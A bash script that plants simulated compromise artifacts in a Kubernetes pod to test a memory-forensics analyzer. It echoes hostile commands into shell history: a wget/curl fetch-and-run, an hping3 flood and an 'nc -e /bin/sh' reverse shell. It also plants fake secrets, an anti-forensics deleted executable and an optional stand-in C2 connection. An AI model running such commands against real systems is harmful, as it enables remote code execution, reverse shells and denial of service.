#!/usr/bin/env bash
# Step 1 of the demo attack: simulate a compromise.
#   - drop a malicious executable into the pod (STATIC artifact only; never +x/run)
#   - run some suspicious commands so they land in shell history
#
# The sample is analyzed statically by the classifier; it is NOT executed, so the
# demo stays safe. The actual pod crash is driven separately by ddos_flood.py.
#
# Usage:
#   ./plant_artifacts.sh <pod> [namespace] [path-to-sample-elf]
#   ./plant_artifacts.sh webserver default ./samples/mirai_sample.elf
set -euo pipefail

POD="${1:?usage: plant_artifacts.sh <pod> [ns] [sample.elf]}"
NS="${2:-default}"
SAMPLE="${3:-}"

echo "[*] target pod: $NS/$POD"

# 1) drop the malicious executable into /tmp (inside the pod)
if [[ -n "$SAMPLE" && -f "$SAMPLE" ]]; then
  echo "[*] copying malicious sample $SAMPLE -> $POD:/tmp/.x  (not executed)"
  kubectl cp "$SAMPLE" "$NS/$POD:/tmp/.x"
else
  echo "[*] no sample provided; generating a benign stand-in binary with bot-like strings"
  kubectl exec -n "$NS" "$POD" -- sh -c '
    cp /bin/busybox /tmp/.x 2>/dev/null || cp /bin/ls /tmp/.x;
    printf "\nMIRAI\ngafgyt\nhttp://185.10.68.12/bins/x\nstratum+tcp://pool:3333\n" >> /tmp/.x'
fi

# 2) run suspicious commands so they enter bash history / process table
echo "[*] running suspicious commands inside the pod"
kubectl exec -n "$NS" "$POD" -- sh -c '
  export HISTFILE=/root/.bash_history
  echo "wget http://185.10.68.12/bot -O /tmp/.x && chmod +x /tmp/.x && /tmp/.x" >> /root/.bash_history
  echo "curl http://45.9.148.7/x | sh"                                          >> /root/.bash_history
  echo "hping3 --flood -S -p 80 10.0.0.5"                                        >> /root/.bash_history
  echo "nc -e /bin/sh 45.9.1.2 4444"                                            >> /root/.bash_history
  echo "chmod +x /tmp/.x"                                                        >> /root/.bash_history
  ls -la /tmp/.x
' || true

# ---------------------------------------------------------------------------
# Extra MEMORY-ONLY artifacts — these live only in RAM and are recovered by the
# analyzer from the checkpoint. Each is started with `setsid` so it DETACHES from
# the exec session (no attached exec = CRIU checkpoint stays reliable) and keeps
# running inside the pod until the watcher captures + kills it.
# ---------------------------------------------------------------------------
echo "[*] planting memory-only artifacts (deleted-exe, secrets, process chain)"

# (a) deleted-but-running executable: copy a binary, run it, delete it from disk.
#     The process keeps running with its on-disk file gone -> classic anti-forensics.
kubectl exec -n "$NS" "$POD" -- sh -c '
  cp /bin/sleep /tmp/.hidden 2>/dev/null || cp /usr/bin/sleep /tmp/.hidden;
  setsid /tmp/.hidden 3600 >/dev/null 2>&1 &
  sleep 1; rm -f /tmp/.hidden; echo "[pod] deleted-but-running exe active"' || true

# (b) in-memory secrets: a long-running process holding credentials in its env,
#     which the analyzer carves out of the RAM pages.
kubectl exec -n "$NS" "$POD" -- sh -c '
  setsid env AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE \
             DB_PASSWORD=Sup3rS3cretP@ss \
             GITHUB_TOKEN=ghp_0123456789abcdef0123456789abcdef0123 \
             sleep 3600 >/dev/null 2>&1 &
  echo "[pod] in-memory secrets resident"' || true

# (c) suspicious process lineage: a web container spawning nested shells.
kubectl exec -n "$NS" "$POD" -- sh -c '
  setsid sh -c "sh -c \"sleep 3600\"" >/dev/null 2>&1 &
  echo "[pod] suspicious shell chain spawned"' || true

# (d) OPTIONAL outbound C2 connection. A live external TCP connection may require
#     CRIU --tcp-established to checkpoint; if enabling this makes the checkpoint
#     fail (HTTP 500), leave it OFF. Enable with:  WITH_NETWORK=1 ./plant_artifacts.sh ...
if [ "${WITH_NETWORK:-0}" = "1" ]; then
  kubectl exec -n "$NS" "$POD" -- bash -c '
    setsid bash -c "exec 3<>/dev/tcp/8.8.8.8/443; sleep 3600" >/dev/null 2>&1 &
    echo "[pod] outbound connection opened (C2 stand-in)"' || true
fi

echo "[+] compromise simulated:"
echo "    file: /tmp/.x    commands: history    memory: deleted-exe, secrets, shell chain"
echo "    next: run  python3 ddos_flood.py --memory --pod $POD --target-mb 105  to trip the watcher."
